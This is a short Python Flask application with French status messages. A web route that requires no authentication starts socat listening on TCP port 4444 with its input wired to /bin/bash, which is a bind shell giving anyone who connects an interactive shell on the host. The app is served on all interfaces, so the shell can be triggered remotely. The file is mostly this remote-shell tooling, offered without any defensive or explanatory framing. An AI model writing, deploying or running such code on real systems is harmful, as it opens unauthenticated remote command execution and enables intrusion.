from flask import Flask, render_template, jsonify
import subprocess
import threading
import time

app = Flask(__name__)

listener_thread = None
listener_active = False
listener_output = ""

def run_listener():
    global listener_active, listener_output
    listener_active = True
    try:
        cmd = ["socat", "TCP4-LISTEN:4444,reuseaddr,fork", "EXEC:/bin/bash"]
        listener_output = "En attente de connexion sur le port 4444..."
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for _ in range(30):
            if proc.poll() is not None:
                listener_output = "Shell fermé ou échec de connexion."
                listener_active = False
                return
            time.sleep(1)

        listener_output = "Shell toujours actif. Connexion probablement établie."
    except Exception as e:
        listener_output = f"Erreur : {str(e)}"
    finally:
        listener_active = False

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/start_listener")
def start_listener():
    global listener_thread, listener_active
    if not listener_active:
        listener_thread = threading.Thread(target=run_listener)
        listener_thread.start()
        return jsonify({"status": "Listener démarré..."})
    else:
        return jsonify({"status": "Déjà actif."})

@app.route("/listener_status")
def listener_status():
    return jsonify({"status": listener_output})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
